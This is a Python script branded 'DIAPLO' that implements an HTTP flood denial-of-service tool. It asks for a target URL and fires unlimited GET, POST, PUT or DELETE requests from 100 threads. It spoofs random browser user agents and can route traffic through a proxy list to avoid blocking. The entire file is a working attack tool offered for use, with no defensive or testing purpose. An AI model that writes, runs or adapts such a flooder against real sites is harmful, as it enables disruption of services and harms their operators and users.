
import requests
import random
import time
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
from termcolor import colored
from retry import retry

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def print_skull():
    skull = """                                     

  D I A P L O - @pqqqf   
    """
    print(colored(skull, 'red'))

def random_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
    ]
    return random.choice(user_agents)

@retry(tries=3, delay=2, backoff=2)
def send_request(url, method, proxies, attack_number, error_messages):
    headers = {
        "User-Agent": random_user_agent(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive"
    }
    try:
        if method == "GET":
            response = requests.get(url, headers=headers, proxies=proxies)
        elif method == "POST":
            response = requests.post(url, headers=headers, data={'attack_number': attack_number}, proxies=proxies)
        elif method == "PUT":
            response = requests.put(url, headers=headers, data={'attack_number': attack_number}, proxies=proxies)
        elif method == "DELETE":
            response = requests.delete(url, headers=headers, proxies=proxies)
        else:
            return False

        response.raise_for_status()
        return response.status_code == 200
    except Exception as e:
        error_messages.append(f"Request failed for attack_number {attack_number}: {e}")
        return False  # Return False instead of raising an exception

def flood(url, count, interval, method, proxy_list):
    logging.info(f"Starting to send {method} requests to {url}...")

    total_sent = 0
    error_messages = []
    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = []
        i = 0
        while count == -1 or i < count:
            try:
                proxy = random.choice(proxy_list) if proxy_list else None
                proxies = {"http": proxy, "https": proxy} if proxy else None
                futures.append(executor.submit(send_request, url, method, proxies, i + 1, error_messages))
                i += 1
                if interval > 0:
                    time.sleep(interval)
            except KeyboardInterrupt:
                logging.warning("Operation cancelled by user.")
                break

        for future in as_completed(futures):
            try:
                if future.result():
                    total_sent += 1
            except Exception:
                pass

    if error_messages:
        logging.error("The following errors occurred during the request process:")
        for message in error_messages:
            logging.error(message)

    logging.info(f"Request sent to {url} with total requests: {total_sent}")

if __name__ == "__main__":
    print_skull()

    url = input(colored("Enter the target URL (e.g., http://example.com or https): ", 'blue'))
    packet_count = int(input(colored("Enter the number of requests to send (-1 for infinite): ", 'blue')))
    interval = float(input(colored("Enter the interval between requests (in seconds, use 0 for fastest): ", 'blue')))
    method = input(colored("Enter the request method (GET, POST, PUT, DELETE): ", 'blue')).upper()

    use_proxies = input(colored("Do you want to use proxies? (yes/no): ", 'blue')).lower() == 'yes'
    proxy_list = []

    if use_proxies:
        proxy_file = input(colored("Enter the path to the proxy list file: ", 'blue'))
        try:
            with open(proxy_file, 'r') as file:
                proxy_list = list(set(line.strip() for line in file.readlines()))
            logging.info(f"Loaded {len(proxy_list)} proxies.")
        except FileNotFoundError:
            logging.error("Proxy file not found. Continuing without proxies.")
            use_proxies = False

    flood(url, packet_count, interval, method, proxy_list)
